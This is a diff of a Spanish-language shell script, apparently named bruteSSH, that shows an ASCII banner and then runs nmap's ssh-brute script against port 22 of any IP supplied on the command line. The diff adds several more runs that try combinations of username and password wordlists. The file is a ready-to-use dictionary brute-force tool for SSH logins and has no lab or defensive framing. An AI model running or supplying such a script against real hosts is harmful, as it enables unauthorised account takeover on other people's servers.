@@ -15,7 +15,7 @@ cat << "INFO"
   ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
    MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
   .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
-  MMM      :M  'MMMMMMMMMMM bruteSSH2 MMMMMMMM'.MM  MM:M.    'MMMMM
+  MMM      :M  'MMMMMMMMMMM bruteSSH MMMMMMMM'.MM  MM:M.    'MMMMM
  .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
 AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
 MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
@@ -31,15 +31,21 @@ MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
                          ''MMMMMMJJJJJJJJJJ'
                                  'JJJJJJJJ'
 
+                                                 http://www.hackingyseguridad.com 
 INFO
 if [ -z "$1" ]; then
         echo
         echo "Fuerza bruta con diccionarios a SSH."
         echo "Requiere nmap"
-        echo "Uso.: sh brutessh2.sh <ip>"
+        echo "Uso.: sh brutessh.sh <ip>"
         echo
         exit 0
 fi
 echo
 echo
 nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0
+nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0
+nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0
+nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0
+nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
+nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0
